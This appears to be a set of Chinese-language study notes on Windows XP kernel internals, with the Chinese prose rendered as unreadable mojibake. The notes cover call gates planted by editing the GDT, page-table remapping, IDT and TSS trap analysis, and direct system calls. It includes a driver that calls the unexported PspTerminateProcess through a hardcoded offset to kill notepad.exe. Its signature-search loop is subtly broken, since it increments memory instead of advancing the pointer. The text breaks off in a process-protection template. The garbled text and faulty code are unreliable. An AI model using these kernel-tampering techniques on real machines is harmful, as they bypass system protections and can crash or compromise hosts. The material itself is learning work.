printf(\"0x8003f048 U/S,Gä½ä¿®æ”¹æˆåŠŸ.\\n\"); printf(\"*(PDWORD)0x8003f048 = %08x\\n\", *(PDWORD)0x8003f048); *(PDWORD)0x8003f048 = 0x12345678; printf(\"*(PDWORD)0x8003f048 = %08x\\n\", *(PDWORD)0x8003f048); getchar(); return 0; } TLB æµ‹è¯•è¿™ä¸ªç»“æ„\nä»£ç å¦‚ä¸‹ï¼š\n//10-10-12ä¸‹çš„ #include \u003cwindows.h\u003e #include \u003cstdio.h\u003e DWORD TempFnAddress; void __declspec(naked) Proc()//401030 { _asm { mov dword ptr ds:[0xc0000000],0x1234967 mov dword ptr ds:[0],0x12345876 //INVLPG dword ptr ds:[0] //mov eax,cr3 //mov cr3,eax mov dword ptr ds:[0xc0000000],0x0234567 mov eax,dword ptr ds:[0] mov TempFnAddress,eax retf } } int main(int argc, char* argv[]) { char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, åºŸå¼ƒ *(WORD*)\u0026buff[4] = 0x48; // æ®µé€‰æ‹©å­ _asm { call far fword ptr[buff]//eq 8003f048 0040EC00`00081030 } printf(\"%x\\n\",TempFnAddress); getchar(); return 0; } ä¸­æ–­ä¸å¼‚å¸¸ kd\u003e dq idtr 8003f400 804d8e00`0008f50e 804d8e00`0008f68d 8003f410 00008500`0058113e 804dee00`0008faa1 8003f420 804dee00`0008fc24 804d8e00`0008fd89 8003f430 804d8e00`0008ff0a 804e8e00`00080583 8003f440 00008500`00501198 804e8e00`00080988 8003f450 804e8e00`00080aa6 804e8e00`00080be3 8003f460 804e8e00`00080e40 804e8e00`0008113c 8003f470 804e8e00`00081867 804e8e00`00081b9c kd\u003e dq gdtr 8003f000 00000000`00000000 00cf9b00`0000ffff 8003f010 00cf9300`0000ffff 00cffb00`0000ffff 8003f020 00cff300`0000ffff 80008b04`200020ab 8003f030 ffc093df`f0000001 7f40f3fd`f0000fff 8003f040 0000f200`0400ffff 0040ec00`00081020 8003f050 80008955`87000068 80008b55`87680068 8003f060 00009302`2f40ffff 0000920b`80003fff 8003f070 ff0092ff`700003ff 80009a40`0000ffff å¸ˆå‚…è¯´è¿™ä¸ªFSå¯„å­˜å™¨é‡Œé¢æœ‰ä¸€ä¸ªç»“æ„ä½“å¦‚ä¸‹ï¼š\ndt _KPCR ffdff000 nt!_KPCR +0x000 NtTib : _NT_TIB +0x01c SelfPcr : 0xffdff000 _KPCR +0x020 Prcb : 0xffdff120 _KPRCB +0x024 Irql : 0x1c '' +0x028 IRR : 0 +0x02c IrrActive : 0 +0x030 IDR : 0xffff20f8 +0x034 KdVersionBlock : 0x80546ab8 Void +0x038 IDT : 0x8003f400 _KIDTENTRY +0x03c GDT : 0x8003f000 _KGDTENTRY +0x040 TSS : 0x80042000 _KTSS +0x044 MajorVersion : 1 +0x046 MinorVersion : 1 +0x048 SetMember : 1 +0x04c StallScaleFactor : 0x64 +0x050 DebugActive : 0 '' +0x051 Number : 0 '' +0x052 Spare0 : 0 '' +0x053 SecondLevelCacheAssociativity : 0 '' +0x054 VdmAlert : 0 +0x058 KernelReserved : [14] 0 +0x090 SecondLevelCacheSize : 0 +0x094 HalReserved : [16] 0 +0x0d4 InterruptMode : 0 +0x0d8 Spare1 : 0 '' +0x0dc KernelReserved2 : [17] 0 +0x120 PrcbData : _KPRCB åˆ†æIDTè¡¨ä¸­0x2å·ä¸­æ–­çš„æ‰§è¡Œæµç¨‹ã€‚\n00008500`0058113e 58 = 0101 1 000 index = 11(æ‰¾gdtè¡¨çš„ç´¢å¼•) 80008b55`87680068 address = 80558768 kd\u003e dd 80558768 80558768 00000028 80555700 00000010 00000000 80558778 00000000 00000000 00000000 00039000 80558788 804df780 00000000 00000000 00000000 80558798 00000000 00000000 80555700 00000000 805587a8 00000000 00000000 00000023 00000008 805587b8 00000010 00000023 00000030 00000000 805587c8 00000000 20ac0000 00000000 00000000 805587d8 80555668 00000000 00000001 0000000a è¿™ä¸ªæ˜¯ä¸ªä»»åŠ¡æ®µï¼Œæ‰¾åˆ°åœ¨TSSé‡Œé¢çš„eipï¼Œé‚£ä¹ˆeip = 804df780ï¼Œåœ¨åæ±‡ç¼–çª—å£çœ‹ä¸€ä¸‹åœ°å€ nt!KiTrap02: ffffffff`804df780 fa cli ;å±è”½å¯å±è”½ä¸­æ–­ ffffffff`804df781 64ff3540000000 push dword ptr fs:[40h] ;TSS ffffffff`804df788 64a13c000000 mov eax, dword ptr fs:[0000003Ch] ;GDT ffffffff`804df78e 8a685f mov ch, byte ptr [eax+5Fh] ffffffff`804df791 8a485c mov cl, byte ptr [eax+5Ch] ffffffff`804df794 c1e110 shl ecx, 10h ffffffff`804df797 668b485a mov cx, word ptr [eax+5Ah] ffffffff`804df79b 64890d40000000 mov dword ptr fs:[40h], ecx ;æ”¹TSS ffffffff`804df7a2 9c pushfd ffffffff`804df7a3 812424ffbfffff and dword ptr [esp], 0FFFFBFFFh ffffffff`804df7aa 9d popfd ffffffff`804df7ab 648b0d3c000000 mov ecx, dword ptr fs:[3Ch] ffffffff`804df7b2 8d4158 lea eax, [ecx+58h] ffffffff`804df7b5 c6400589 mov byte ptr [eax+5], 89h ffffffff`804df7b9 8b0424 mov eax, dword ptr [esp] ffffffff`804df7bc 6a00 push 0 ffffffff`804df7be 6a00 push 0 ffffffff`804df7c0 6a00 push 0 ffffffff`804df7c2 6a00 push 0 ffffffff`804df7c4 ff7050 push dword ptr [eax+50h] ffffffff`804df7c7 ff7038 push dword ptr [eax+38h] ffffffff`804df7ca ff7024 push dword ptr [eax+24h] ffffffff`804df7cd ff704c push dword ptr [eax+4Ch] ffffffff`804df7d0 ff7020 push dword ptr [eax+20h] ffffffff`804df7d3 6a00 push 0 ffffffff`804df7d5 ff703c push dword ptr [eax+3Ch] ffffffff`804df7d8 ff7034 push dword ptr [eax+34h] ffffffff`804df7db ff7040 push dword ptr [eax+40h] ffffffff`804df7de ff7044 push dword ptr [eax+44h] ffffffff`804df7e1 ff7058 push dword ptr [eax+58h] ffffffff`804df7e4 64ff3500000000 push dword ptr fs:[0] ffffffff`804df7eb 6aff push 0FFFFFFFFh ffffffff`804df7ed ff7028 push dword ptr [eax+28h] ffffffff`804df7f0 ff702c push dword ptr [eax+2Ch] ffffffff`804df7f3 ff7030 push dword ptr [eax+30h] ffffffff`804df7f6 ff7054 push dword ptr [eax+54h] ffffffff`804df7f9 ff7048 push dword ptr [eax+48h] ffffffff`804df7fc ff705c push dword ptr [eax+5Ch] ffffffff`804df7ff 6a00 push 0 ffffffff`804df801 6a00 push 0 ffffffff`804df803 6a00 push 0 ffffffff`804df805 6a00 push 0 ffffffff`804df807 6a00 push 0 ffffffff`804df809 6a00 push 0 ffffffff`804df80b 6a00 push 0 ffffffff`804df80d 6a00 push 0 ffffffff`804df80f 6a00 push 0 ffffffff`804df811 6a00 push 0 ffffffff`804df813 ff7020 push dword ptr [eax+20h] ffffffff`804df816 ff703c push dword ptr [eax+3Ch] ffffffff`804df819 8bec mov ebp, esp ffffffff`804df81b 33db xor ebx, ebx ffffffff`804df81d 648a1d51000000 mov bl, byte ptr fs:[51h] ffffffff`804df824 391ddc875580 cmp dword ptr ds:[805587DCh], ebx ffffffff`804df82a 7414 je ntkrnlmp!_KiTrap02+0xc0 (804df840) ffffffff`804df82c 8d05d8875580 lea eax, ds:[805587D8h] ffffffff`804df832 50 push eax ffffffff`804df833 6a00 push 0 ffffffff`804df835 8bcc mov ecx, esp ffffffff`804df837 8bd5 mov edx, ebp ffffffff`804df839 e8979f0500 call ntkrnlmp!@KiAcquireQueuedSpinLockCheckForFreeze@8 (805397d5) ffffffff`804df83e eb24 jmp ntkrnlmp!_KiTrap02+0xe4 (804df864) ffffffff`804df840 833de087558008 cmp dword ptr ds:[805587E0h], 8 ffffffff`804df847 721b jb ntkrnlmp!_KiTrap02+0xe4 (804df864) ffffffff`804df849 7517 jne ntkrnlmp!_KiTrap02+0xe2 (804df862) ffffffff`804df84b 803d40ca558000 cmp byte ptr ds:[8055CA40h], 0 ffffffff`804df852 750e jne ntkrnlmp!_KiTrap02+0xe2 (804df862) ffffffff`804df854 803d41ca558000 cmp byte ptr ds:[8055CA41h], 0 ffffffff`804df85b 7405 je ntkrnlmp!_KiTrap02+0xe2 (804df862) ffffffff`804df85d e8c17f0500 call ntkrnlmp!_KeEnterKernelDebugger@0 (80537823) ffffffff`804df862 ebfe jmp ntkrnlmp!_KiTrap02+0xe2 (804df862) ffffffff`804df864 891ddc875580 mov dword ptr ds:[805587DCh], ebx ffffffff`804df86a ff05e0875580 inc dword ptr ds:[805587E0h] ffffffff`804df870 6a00 push 0 ffffffff`804df872 ff158c904d80 call dword ptr ds:[804D908Ch] ffffffff`804df878 ff0de0875580 dec dword ptr ds:[805587E0h] ffffffff`804df87e 754a jne ntkrnlmp!_KiTrap02+0x14a (804df8ca) ffffffff`804df880 c705dc875580ffffffff mov dword ptr ds:[805587DCh], 0FFFFFFFFh ffffffff`804df88a 8bcc mov ecx, esp ffffffff`804df88c e8933c0000 call ntkrnlmp!@KeReleaseQueuedSpinLockFromDpcLevel@4 (804e3524) ffffffff`804df891 83c408 add esp, 8 ffffffff`804df894 64a140000000 mov eax, dword ptr fs:[00000040h] ffffffff`804df89a 66833858 cmp word ptr [eax], 58h ffffffff`804df89e 742a je ntkrnlmp!_KiTrap02+0x14a (804df8ca) ffffffff`804df8a0 81c48c000000 add esp, 8Ch ffffffff`804df8a6 648f0540000000 pop dword ptr fs:[40h] ffffffff`804df8ad 648b0d3c000000 mov ecx, dword ptr fs:[3Ch] ffffffff`804df8b4 8d4128 lea eax, [ecx+28h] ffffffff`804df8b7 c640058b mov byte ptr [eax+5], 8Bh ffffffff`804df8bb 9c pushfd ffffffff`804df8bc 810c2400400000 or dword ptr [esp], 4000h ffffffff`804df8c3 9d popfd ffffffff`804df8c4 cf iretd åˆ†æIDTè¡¨ä¸­0x8å·ä¸­æ–­çš„æ‰§è¡Œæµç¨‹ã€‚\nkd\u003e dd 80558700 ReadVirtual: 80558700 not properly sign extended 80558700 00000000 80555700 00000010 00000000 80558710 00000000 00000000 00000000 00039000 80558720 804e0891 00000000 00000000 00000000 80558730 00000000 00000000 80555700 00000000 80558740 00000000 00000000 00000023 00000008 80558750 00000010 00000023 00000030 00000000 80558760 00000000 20ac0000 00000028 80555700 80558770 00000010 00000000 00000000 00000000 eip = 804e0891 nt!KiTrap08: ffffffff`804e0891 fa cli ;å±è”½å¯å±è”½ä¸­æ–­ ffffffff`804e0892 648b0d3c000000 mov ecx, dword ptr fs:[3Ch] ffffffff`804e0899 8d4150 lea eax, [ecx+50h] ffffffff`804e089c c6400589 mov byte ptr [eax+5], 89h ffffffff`804e08a0 9c pushfd ffffffff`804e08a1 812424ffbfffff and dword ptr [esp], 0FFFFBFFFh ffffffff`804e08a8 9d popfd ffffffff`804e08a9 64a13c000000 mov eax, dword ptr fs:[0000003Ch] ffffffff`804e08af 8a6857 mov ch, byte ptr [eax+57h] ffffffff`804e08b2 8a4854 mov cl, byte ptr [eax+54h] ffffffff`804e08b5 c1e110 shl ecx, 10h ffffffff`804e08b8 668b4852 mov cx, word ptr [eax+52h] ffffffff`804e08bc 64a140000000 mov eax, dword ptr fs:[00000040h] ffffffff`804e08c2 64890d40000000 mov dword ptr fs:[40h], ecx ffffffff`804e08c9 6a00 push 0 ffffffff`804e08cb 6a00 push 0 ffffffff`804e08cd 6a00 push 0 ffffffff`804e08cf 50 push eax ffffffff`804e08d0 6a08 push 8 ffffffff`804e08d2 6a7f push 7Fh ffffffff`804e08d4 e811720500 call ntkrnlmp!_KeBugCheck2@24 (80537aea) ffffffff`804e08d9 ebee jmp ntkrnlmp!_KiTrap08+0x38 (804e08c9) ffffffff`804e08db 90 nop é˜¶æ®µæµ‹è¯• ç»™å®šä¸€ä¸ªçº¿æ€§åœ°å€ï¼Œå’Œé•¿åº¦ï¼Œè¯»å–å†…å®¹ï¼›\nint ReadMemory(OUT BYTE* bufferï¼ŒIN DWORD dwAddrï¼ŒIN DWORD dwLeght)\nè¦æ±‚ï¼š\nå¯ä»¥è‡ªå·±æŒ‡å®šåˆ†é¡µæ–¹å¼ã€‚ é¡µä¸å­˜åœ¨ï¼Œè¦æç¤ºï¼Œä¸èƒ½æŠ¥é”™ã€‚ å¯ä»¥æ­£ç¡®è¯»å–æ•°æ®ã€‚ ç”³è¯·é•¿åº¦ä¸º100çš„DWORDçš„æ•°ç»„ï¼Œä¸”æ¯é¡¹ç”¨è¯¥é¡¹çš„åœ°å€åˆå§‹åŒ–ï¼›\næŠŠè¿™ä¸ªæ•°ç»„æ‰€åœ¨çš„ç‰©ç†é¡µæŒ‚åˆ°0x1000çš„åœ°å€ä¸Šï¼›å®šä¹‰ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘0x1000è¿™ä¸ªé¡µé‡Œçš„æ•°ç»„æ‰€åœ¨çš„åœ°å€ï¼Œç”¨0x1000è¿™ä¸ªé¡µçš„çº¿æ€§åœ°å€æ‰“å°å‡ºè¿™æ•°ç»„çš„å€¼ï¼›\nè¦æ±‚ï¼šæ•°ç»„æ‰€åœ¨çš„ç‰©ç†é¡µï¼Œæ˜¯åŒä¸€ä¸ªé¡µ\n#include\u003cwindows.h\u003e #include \u003cstdio.h\u003e DWORD* arr; DWORD* GetPDE(DWORD addr) { return (DWORD*)(0xc0600000+((addr\u003e\u003e18)\u00260x3ff8)); } DWORD* GetPTE(DWORD addr) { return (DWORD*)(0xc0000000+((addr\u003e\u003e9)\u00260x7ffff8)); } __declspec(naked) void func() { __asm { pushad pushfd } *GetPTE(0x1000)|=*GetPTE((DWORD)arr); __asm { popfd popad iretd } } int main(int argc, char* argv[]) { int i=0; unsigned long* p; char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, åºŸå¼ƒ *(WORD*)\u0026buff[4] = 0x48; // æ®µé€‰æ‹©å­ arr=(DWORD*)VirtualAlloc(0,0x1000,MEM_COMMIT,PAGE_READWRITE); if (arr == NULL) { printf(\"Memory allocation failed.\\n\"); return 1; } for(i=0;i\u003c100;i++) { arr[i]=(DWORD)(arr); } printf(\"eq 8003f500 %04xee00`0008%04x\",(DWORD)func\u003e\u003e16,(DWORD)func\u00260x0000ffff);//è°ƒç”¨é—¨æè¿°ç¬¦ä¸ºï¼š0000EC00`00080000 getchar(); //__asm int 0x20 _asm { call far fword ptr[buff] } p=(DWORD*)(0x1000); //printf(\"%x\\n\",p); for(i=0;i\u003c100;i++) { printf(\"%x:%x\\n\",i,p[i]); } getchar(); return 0; } é©±åŠ¨ 01 ç”³è¯·ä¸€å—å†…å­˜ï¼Œå¹¶åœ¨å†…å­˜ä¸­å­˜å‚¨GDTï¼ŒIDTçš„æ‰€æœ‰æ•°æ®ã€‚ç„¶ååœ¨debugviewä¸­æ˜¾ç¤ºå‡ºæ¥ï¼Œæœ€åé‡Šæ”¾å†…å­˜ã€‚\n#include \u003cntddk.h\u003e //å¸è½½å‡½æ•° VOID DriverUnload(PDRIVER_OBJECT driver) { DbgPrint(\"é©±åŠ¨ç¨‹åºåœæ­¢è¿è¡Œäº†\\n\"); } //å…¥å£å‡½æ•°ï¼Œç›¸å½“äºmain NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) { //é©±åŠ¨ç¨‹åºå…¥å£ //å†…æ ¸å¼€è¾Ÿç©ºé—´ PULONG AddrTemp = 0; ULONG StartAddr = 0x8003F000; ULONG i= 0; PULONG Addr = (PULONG)ExAllocatePool(NonPagedPool,0x10000); //åˆå§‹åŒ– RtlFillMemory(Addr,0x10000,0); //ä»GDTå’ŒIDTæ‹·è´æ•°æ® //GDT 0x8003F000 0x3FF 0x8003F000 0x7FF RtlMoveMemory(Addr,(CONST VOID UNALIGNED*)StartAddr,0xBFE); AddrTemp = (PULONG)Addr; for (i=0;i\u003c0x40;i++) { DbgPrint(\"%08X %08X %08X %08X %08X\",StartAddr,*(AddrTemp+1),*AddrTemp,*(AddrTemp+3),*(AddrTemp+2));\tAddrTemp+=4; //ä¸ºä»€ä¹ˆ1å’Œ3åœ¨å‰é¢? ä¸ºäº†å’Œwindbgæ˜¾ç¤ºä¸€æ ·ï¼Œæ¢äº†ä¸€ä¸‹æ¬¡åº StartAddr+=0x10; } DbgPrint(\"GDTè¡¨æ‰“å°å®Œæ¯•\"); for (i=0;i\u003c0x80;i++) { DbgPrint(\"%08X %08X %08X %08X %08X\",StartAddr,*(AddrTemp+1),*AddrTemp,*(AddrTemp+3),*(AddrTemp+2)); AddrTemp+=4; StartAddr+=0x10; } DbgPrint(\"IDTè¡¨æ‰“å°å®Œæ¯•\"); //freeé‡Šæ”¾ ExFreePool(Addr); //è®¾ç½®ä¸€ä¸ªå¸è½½å‡½æ•°ï¼Œä¾¿äºé€€å‡º driver-\u003eDriverUnload = DriverUnload; return STATUS_SUCCESS; } ç¼–å†™ä»£ç ï¼Œå®ç°å¦‚ä¸‹åŠŸèƒ½ï¼š\nåˆå§‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸² æ‹·è´ä¸€ä¸ªå­—ç¬¦ä¸² æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ ANSI_STRINGä¸UNICODE_STRINGå­—ç¬¦ä¸²ç›¸äº’è½¬æ¢ #include \u003cntddk.h\u003e //å¸è½½å‡½æ•° VOID DriverUnload(PDRIVER_OBJECT driver) { DbgPrint(\"é©±åŠ¨ç¨‹åºåœæ­¢è¿è¡Œäº†\"); } //å…¥å£å‡½æ•°ï¼Œç›¸å½“äºmain NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) { ANSI_STRING ANString1; ANSI_STRING ANString2; UNICODE_STRING StrUnicode; RtlInitAnsiString(\u0026ANString1,\"ANString1\"); RtlInitAnsiString(\u0026ANString2,\"ANString2\"); RtlInitUnicodeString(\u0026StrUnicode,L\"StrUnicode\"); DbgPrint(\"ANString1 = %Z\\n\",\u0026ANString1); DbgPrint(\"ANString2 = %Z\\n\",\u0026ANString2); DbgPrint(\"StrUnicode = %wZ\\n\",\u0026StrUnicode); if (RtlCompareString(\u0026ANString1,\u0026ANString2,TRUE) == 0) { DbgPrint(\"ANString1 = ANString2\"); } else { DbgPrint(\"å­—ç¬¦ä¸²ä¸ç›¸ç­‰.\\r\\n\"); } RtlCopyString(\u0026ANString2,\u0026ANString1); DbgPrint(\"ANString1 = %Z\\n\",\u0026ANString1); DbgPrint(\"ANString2 = %Z\\n\",\u0026ANString2); DbgPrint(\"StrUnicode = %wZ\\n\",\u0026StrUnicode); if (RtlAnsiStringToUnicodeString(\u0026StrUnicode,\u0026ANString1,TRUE) == STATUS_SUCCESS) { DbgPrint(\"ANString1 = %Z\\n\",\u0026ANString1); DbgPrint(\"ANString2 = %Z\\n\",\u0026ANString2); DbgPrint(\"StrUnicode = %wZ\\n\",\u0026StrUnicode); } driver-\u003eDriverUnload = DriverUnload; return STATUS_SUCCESS; } 02 éå†å†…æ ¸æ¨¡å—ï¼Œè¾“å‡ºæ¨¡å—åç§°ï¼ŒåŸºå€ä»¥åŠå¤§å°ã€‚\n#include \u003cntddk.h\u003e //é©±åŠ¨ç¨‹åºå¿…å¤‡å¤´æ–‡ä»¶ NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { DbgPrint(\"Unloaded Successfully!\"); } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { LIST_ENTRY* list = (LIST_ENTRY*)DriverObject-\u003eDriverSection; LIST_ENTRY* item = list; DRIVER_OBJECT obj; while (1) { PUNICODE_STRING name = (PUNICODE_STRING)(((UINT32)item) + 0x2c); UINT32 DllBase = *(UINT32*)(((UINT32)item) + 0x18); UINT32 ImgSize= *(UINT32*)(((UINT32)item) + 0x20); DbgPrint(\"DriverName : %wZ\\nDllBase : %x\\nImgSize : %x\\n======\\n\", name, DllBase, ImgSize); item = item-\u003eBlink; if (item == list) { break; } } DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œé€šè¿‡ç‰¹å¾ç æœç´¢ä¸€ä¸ªæœªå¯¼å‡ºçš„å‡½æ•°ï¼Œå¹¶è°ƒç”¨ã€‚\nä¾‹å­:æ‰¾åˆ°PspTerminateProcessï¼Œé€šè¿‡è°ƒç”¨è¿™ä¸ªå‡½æ•°ç»“æŸè®°äº‹æœ¬è¿›ç¨‹ã€‚ï¼ˆæ³¨æ„10-10-12åˆ†é¡µæ˜¯ntoskrnl.exeï¼Œ2-9-9-12æ˜¯ntkrnlpa.exeï¼‰\n#include \u003cntddk.h\u003e //é©±åŠ¨ç¨‹åºå¿…å¤‡å¤´æ–‡ä»¶ #include \u003cwdm.h\u003e NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { DbgPrint(\"Unloaded Successfully!\"); return 0; } PVOID Search( PVOID featureCode, UINT32 featureCodeeLen, PVOID BeginAddress, PVOID EndAddress) { PVOID pCur = BeginAddress; while (pCur != EndAddress) { if (RtlCompareMemory(featureCode, pCur, featureCodeeLen) == featureCodeeLen) { // æŒ‡å‘å‡½æ•°é¦–åœ°å€ return ( PUINT32 )(( UINT32 )pCur - 6); } (*(UINT32*)pCur)++; } return 0; } typedef NTSTATUS(*_PspTerminateProcess)(PEPROCESS pEprocess, NTSTATUS ExitCode); _PspTerminateProcess PspTerminateProcess; PEPROCESS GetPROCESS( PCHAR processName) { PEPROCESS pEprocess, pCurProcess; PCHAR ImageFileName; // è·å–å½“å‰è¿›ç¨‹çš„EPROCESS __asm { mov eax, fs: [0x124] ; // è·å–æŒ‡å‘ _KTHREAD çš„æŒ‡é’ˆ mov eax, [eax + 0x44]; // è·å–æŒ‡å‘ _KPROCESS çš„æŒ‡é’ˆï¼Œ å³EPROCESS çš„é¦–åœ°å€ mov pEprocess, eax; } pCurProcess = pEprocess; // éå†EPROCESS do { ImageFileName = ( PCHAR )pCurProcess + 0x174; // è¿›ç¨‹å if ( strcmp (ImageFileName, processName) == 0) { return pCurProcess; } pCurProcess = (PEPROCESS)(*( PULONG )(( ULONG )pCurProcess + 0x88) - 0x88); // æ›´æ–°è¿›ç¨‹ } while (pEprocess != pCurProcess); return 0; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { LIST_ENTRY* lethis = (LIST_ENTRY*)DriverObject-\u003eDriverSection; LIST_ENTRY* item = lethis; UINT32 DllBase = 0; UINT32 ImgSize = 0; UNICODE_STRING krnl; PEPROCESS Extprocess; RtlInitUnicodeString(\u0026krnl, L\"ntoskrnl.exe\"); while (1) { PUNICODE_STRING name = (PUNICODE_STRING)(((UINT32)item) + 0x2c); UINT32 ImgSize= *(UINT32*)(((UINT32)item) + 0x20); if (!RtlCompareUnicodeString(name,\u0026krnl,FALSE)) { DllBase = *(UINT32*)(((UINT32)item) + 0x18); break; } item = item-\u003eBlink; if (item == lethis) { DbgPrint( \"not found\\n\"); break; } } Extprocess = GetPROCESS( \"notepad.exe\" ); DbgPrint( \"processï¼š%p.\\n\" , Extprocess); if (Extprocess == 0) { DbgPrint( \"error\\n\"); DriverObject-\u003eDriverUnload = (PDRIVER_UNLOAD)UnloadDriver; return STATUS_SUCCESS; } if (DllBase) { PspTerminateProcess = (_PspTerminateProcess)(DllBase + 0xF1DA4); //0xF1DA4 å°±æ˜¯åç§» PspTerminateProcess(Extprocess, 0); } DbgPrint( \"å…³äº†\\n\" ); DriverObject-\u003eDriverUnload = (PDRIVER_UNLOAD)UnloadDriver; return STATUS_SUCCESS; } ç³»ç»Ÿè°ƒç”¨ 01 è‡ªå·±ç¼–å†™WriteProcessMemoryå‡½æ•°ï¼ˆä¸ä½¿ç”¨ä»»ä½•DLLï¼Œç›´æ¥è°ƒç”¨0ç¯å‡½æ•°ï¼‰å¹¶åœ¨ä»£ç ä¸­ä½¿ç”¨ã€‚\nBOOL __declspec(naked) __stdcall WriteProcMemmmm(DWORD handle,DWORD addr,unsigned char* buffer,DWORD len,DWORD sizewrite) { _asm { mov eax, 115h ; mov edx, 7FFE0300h; call dword ptr [edx]; retn 14h; } } 02 è‡ªå·±å®ç°é€šè¿‡ä¸­æ–­é—¨ç›´æ¥è°ƒç”¨å†…æ ¸å‡½æ•°\nBOOL __declspec(naked) __stdcall VirtualAllocMY(DWORD handle,DWORD addr,unsigned char* buffer,DWORD len,DWORD sizewrite) { _asm { mov eax, 11h ; mov edx, 7FFE0300h; lea edx, [esp+8]; int 2Eh; retn; } } 03 ä»Kernel32.dllä¸­æ‰“å¼€æŸä¸ªå‡½æ•°åˆ†ææ‰§è¡Œæµç¨‹ï¼ˆæ€ä¹ˆæ‰¾åˆ°å¯¹åº”çš„å†…æ ¸å‡½æ•°ï¼Œæ€ä¹ˆæ‰¾åˆ°å‚æ•°ï¼Œå¦‚ä½•å°†å‚æ•°ä¼ åˆ°0ç¯çš„ï¼‰\n;virtualAlloc() -\u003e VirtualAllocEx() -\u003e NtAllocateVirtualMemory() ;-------------------Ntdll.dll------------------------------------ .text:7C92CF50 ; __stdcall NtAllocateVirtualMemory(x, x, x, x, x, x) .text:7C92CF50 public _NtAllocateVirtualMemory@24 .text:7C92CF50 _NtAllocateVirtualMemory@24 proc near ; CODE XREF: RtlAllocateHeap(x,x,x)+1126â†“p .text:7C92CF50 ; RtlpFindAndCommitPages(x,x,x,x)+93â†“p ... .text:7C92CF50 mov eax, 10001b ; NtAllocateVirtualMemoryæœåŠ¡å· .text:7C92CF55 mov edx, 7FFE0300h .text:7C92CF5A call dword ptr [edx] ; è°ƒç”¨å…±äº«åŒºå¯¹åº”çš„SystemCallå‡½æ•° .text:7C92CF5C retn 18h .text:7C92CF5C _NtAllocateVirtualMemory@24 endp ;åœ¨windbgä¸­æˆ‘uä¸åˆ°ï¼Œä½†æ˜¯å¯ä»¥ä»ä¸€ä¸‹çœ‹åˆ° /* kd\u003e dd 7FFE0300 7ffe0300 7c92e4f0 7c92e4f4 00000000 00000000 7ffe0310 00000000 00000000 00000000 00000000 7ffe0320 00000000 00000000 00000000 00000000 7ffe0330 ff9d665a 00000000 00000000 00000000 7ffe0340 00000000 00000000 00000000 00000000 7ffe0350 00000000 00000000 00000000 00000000 7ffe0360 00000000 00000000 00000000 00000000 7ffe0370 00000000 00000000 00000000 00000000 kd\u003e ln 7c92e4f0 Browse module Set bu breakpoint (7c92e4f0) ntdll!KiFastSystemCall | (7c92e4f4) ntdll!KiFastSystemCallRet Exact matches: ntdll!KiFastSystemCall (_KiFastSystemCall@0) */ .text:7C92E4F0 public _KiFastSystemCall@0 .text:7C92E4F0 _KiFastSystemCall@0 proc near ; DATA XREF: .text:off_7C923428â†‘o .text:7C92E4F0 mov edx, esp ;ä¿å­˜esp .text:7C92E4F2 sysenter .text:7C92E4F2 _KiFastSystemCall@0 endp ;-------------------------------ntoskrnl.exe------------------------------ ;KiFastCallEntry ;æ‰¾åˆ°å¯¹åº”çš„å†…æ ¸å‡½æ•° .text:004077A1 cmp ecx, 10000b ; æ¯”è¾ƒä¹‹å‰çš„é‚£ä¸ªç¬¬12ä½æ˜¯å¦æ˜¯1 .text:004077A4 jnz short loc_4077C0 ; æŸ¥æ‰¾ç¬¬ä¸€ä¸ªç³»ç»ŸæœåŠ¡è¡¨ .text:004077A6 mov ecx, ds:0FFDFF018h .text:004077AC xor ebx, ebx .text:004077C0 inc dword ptr ds:0FFDFF638h .text:004077C6 mov esi, edx ; esi = edxï¼ˆä¸‰ç¯å‚æ•°çš„æŒ‡é’ˆï¼ˆlea edx, [esp+arg_4]ï¼‰ï¼‰ .text:004077C8 mov ebx, [edi+0Ch] ; ebx = _SYSTEM_SERVICE_TABLE.ArgmentTable .text:004077CB xor ecx, ecx ; æ¸…ç©ºecx .text:004077CD mov cl, [eax+ebx] ; cl = è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„å‚æ•°çš„å­—èŠ‚å¤§å° .text:004077D0 mov edi, [edi] ; edi = _SYSTEM_SERVICE_TABLE.ServiecTableï¼ˆå‡½æ•°åœ°å€è¡¨ï¼‰ .text:004077D2 mov ebx, [edi+eax*4] ; ebx = 0ç¯å‡½æ•°çš„åœ°å€ ;æ‰¾åˆ°å‚æ•°,å¹¶å°†å‚æ•°ä¼ åˆ°0ç¯çš„ .text:004077D5 sub esp, ecx ; æå‡å¯¹åº”çš„å‚æ•°ä¸ªæ•°ä¸ªå †æ ˆï¼ˆè¿™é‡Œçš„ecxæ˜¯è¦æ‰§è¡Œçš„å‚æ•°çš„å­—èŠ‚å¤§å°ï¼‰ .text:004077D7 shr ecx, 2 ; å‚æ•°é•¿åº¦/4 = å‚æ•°ä¸ªæ•°ï¼ˆå››å­—èŠ‚ï¼‰ï¼Œä¸€æ¬¡æ‹·è´4å­—èŠ‚ï¼Œè¿™æ˜¯æ‹·è´çš„æ¬¡æ•° .text:004077DA mov edi, esp ; ediæŒ‡å‘å‡½æ•°å‚æ•°çš„ä½ç½® .text:004077E8 rep movsd ; å¾ªç¯æ‹·è´ .text:004077EA call ebx 04 å†™ä»£ç ä¿æŠ¤æŒ‡å®šè¿›ç¨‹ï¼ˆæ¯”å¦‚è®°äº‹æœ¬ï¼‰ï¼Œé˜²æ­¢åˆ«äººå…³é—­å®ƒï¼Œè€Œè‡ªå·±å…³é—­æ­£å¸¸é€€å‡º æ¨¡æ¿ï¼š\n#include \u003cntddk.h\u003e #include \u003cntstatus.h\u003e /************************************************************************/ /* ç±»å‹å£°æ˜ */ /************************************************************************/ // 